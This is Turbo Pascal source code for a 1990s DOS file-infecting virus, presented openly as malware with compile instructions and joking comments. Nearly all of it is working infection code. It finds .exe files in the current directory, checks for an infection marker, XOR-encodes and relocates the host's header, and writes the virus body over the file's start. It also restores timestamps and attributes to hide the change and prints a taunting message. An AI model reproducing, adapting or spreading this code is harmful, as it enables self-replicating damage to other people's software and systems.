(* 
                       Virus on Pascal. 
    ____________________________________________________________________ 
    This is a nontsr virus that infects *.exe files and codes the saved- 
    part of the file,so it can be hardly cured! 
    To compile,you'll need TurboPascal(I'm using v.7) and CRT.TPU and 
    DOS.TPU libreries! 
    ____________________________________________________________________ 
    (c) 1997 by Master of Infection 
   ------------------------------------------- 
*) 
{$M $1024,0,0}    {Get some Memory!} 
uses dos,crt;   {Using libraries} 
const id='Queen';              {Just my FAVORITE BAND ;-) } 
      long=7504;               {Viri's length} 
      mark=$5B7;               {Where Queen is in Viri} 
var mybuf,exebuf:array [1..long] of char;              {Arrays to use} 
    f,ff,fff,p:file;                      {File handles} 
    s,ss,sss:searchrec;                   {Searchrecords} 
    bufm1:array [1..5] of char;            {Yes,One more array} 
    i:word;                                {And al the rest Variabels...} 
    time,time1,time2:longint; 
    attr,attr1,attr2:byte; 
    q:string; 
    y,j:integer; 
    ee,cmdline:string; 
    coder,decoder:byte; 
(* 
   You could use one proprocedure,but I'v simply desided 
   to practice in Typing :-) 
*) 
procedure decode; 
begin 
    For y:=1 To long Do       {Well,Decode all the bytes in exeBuf array} 
      exeBuf[y]:=Chr(Ord(exeBuf[y]) Xor $7e); 
end; 
procedure code; 
begin 
    For y:=1 To long Do 
       exeBuf[y]:=Chr(Ord(exeBuf[y]) Xor $7e); {We are using here the 7Eh 
code,to XOR all the array} 
end; 
procedure timecomp;       {Just to show ourself} 
label 1,2; 
begin 
    writeln('(c) 1995 Queen Hitman Virus inc.!'); 
    writeln('Ha-ha-ha,You have a virus!'); 
end; 
procedure execute;  {This is a procedure,that will execute the file, 
we are in now(starting from)} 
begin 
    findfirst(paramstr(i),anyfile,sss); {Espessially for MR.LOZINSKY!!! :- } 
    if sss.size long then  { DON't execute the source! :-( } 
    begin 
    assign(fff,sss.name); {Get the file_name in the handle} 
    attr2:=sss.attr;      {Save attributes...} 
    time2:=sss.time;      {... and time of the file} 
    reset(fff,1);     {Open it!} 
    seek(fff,0);        {Head in 0 point} 
    blockread(fff,mybuf,long);        {Read from it the begining} 
    seek(fff,sss.size-long);      {Put the header in the position:File_Size-Virus_size} 
    blockread(fff,exebuf,long);    {And read the source EXE_Header and the file begining} 
    seek(fff,0);                   {Put the Head in 0} 
    decode;                         {Decode it!!! For MR.MOSTOVOY :-} 
    blockwrite(fff,exebuf,long);     {Save the begining} 
    seek(fff,sss.size-long);         {Head in File_Size-Virus_size} 
    truncate(fff);                 {Delete the end of the file,so if you've infected somthin like DR.WEB it woun't shout! ;-) } 
    close(fff);                    {And close it!} 
    setfattr(fff,archive);          {Well,you know...LMD!!!} 
    setftime(fff,time2); 
    IF ParamCount < 0 Then         {NO!!! This thing Executes the file} 
        Begin 
           For I:=1 To ParamCount Do 
             CmdLine:=CmdLine + ' ' + ParamStr(I); 
        End; 
    swapvectors; 
    exec(sss.name,cmdline); 
    swapvectors; 
    reset(fff,1);            {Do it in the back sequence!...} 
    code; 
    seek(fff,0); 
    blockwrite(fff,mybuf,long); 
    seek(fff,sss.size-long); 
    blockwrite(fff,exebuf,long); 
    close(fff); 
    setftime(fff,time2); 
    setfattr(fff,attr2); 
end; 
end; 
(* 
        Procedure,that will INFECT the *.EXE files,in the current directory 
        YEAHHH... 
  
  
*) 
procedure infect; 
label next;      {Just a label} 
begin 
    findfirst('*.exe',anyfile,ss);      {Find the Victim} 
    while doserror=0 do                      {While any available} 
    begin 
       if ss.size < long+1 then goto next;      {Don't infect smaller then we are!} 
       assign(ff,ss.name);           {You already know!} 
       attr1:=ss.attr;               {And this too...} 
       time1:=ss.time; 
       setfattr(ff,archive); 
       reset(ff,1); 
       seek(ff,mark);               {Put the head in the location of "Queen" in Viri(Check if this file is already infected!)} 
       blockread(ff,bufm1,5);       {Read the mark} 
       if bufm1=id then goto next;       {If TRUE,Then already infected :-((( } 
           seek(ff,0);       {NO!!! :-))) } 
           blockread(ff,exebuf,long);   {Copy the file_begining} 
           code;                      {And code it! :-D } 
           seek(ff,ss.size);          {Head=File_End} 
           blockwrite(ff,exebuf,long);        {Write the file_begining} 
           seek(ff,0);               {Head=0} 
           blockwrite(ff,mybuf,long);      {Write Virus!!! :- } 
           close(ff);                   {And close the file} 
           setftime(ff,time1);          {...You know...} 
           setfattr(ff,attr1); 
next:       findnext(ss);            {Seek the next victim! ;-))) } 
     end; 
end; 
(* 
        This is where the virus starts to think about it's children ;-) 
        HeHehe... 
*) 
procedure virusbody; 
label next;      {Label} 
begin 
     findfirst(paramstr(i),anyfile,s); {Executed file} 
     while doserror=0 do           {If available?!?} 
     begin 
       assign(f,s.name);        {Cach the file_name in header} 
       attr:=s.attr;                       {..You..} 
       time:=s.time;                        {..Know..} 
       setfattr(f,archive);          {..All..} 
       reset(f,1);                  {..This..} 
       seek(f,mark);                {Check,if it is a virus(However,here can be a ERROR under DosShell&Win'95) :-((( } 
       blockread(f,bufm1,5); 
       if bufm1=id then       {Yes!!! :-)))) } 
       begin 
           seek(f,0);                {Copy the Virus_Body(It's source)} 
           blockread(f,mybuf,long); 
       end; 
       close(f); 
       setfattr(f,attr); 
       setftime(f,time);                        {And BAY!!!} 
next:  findnext(s); 
     end; 
end; 
(* 
        Here's the reall beginig... 
*) 
begin 
    checkbreak:=false;             {LMS,Don't press ^C,It has to be finished!!! :-))) } 
    virusbody;                     {G } 
    infect;                           { O  } 
    execute;                            {..O} 
    timecomp;                            {N.} 
end.                                     {BAY!!!} 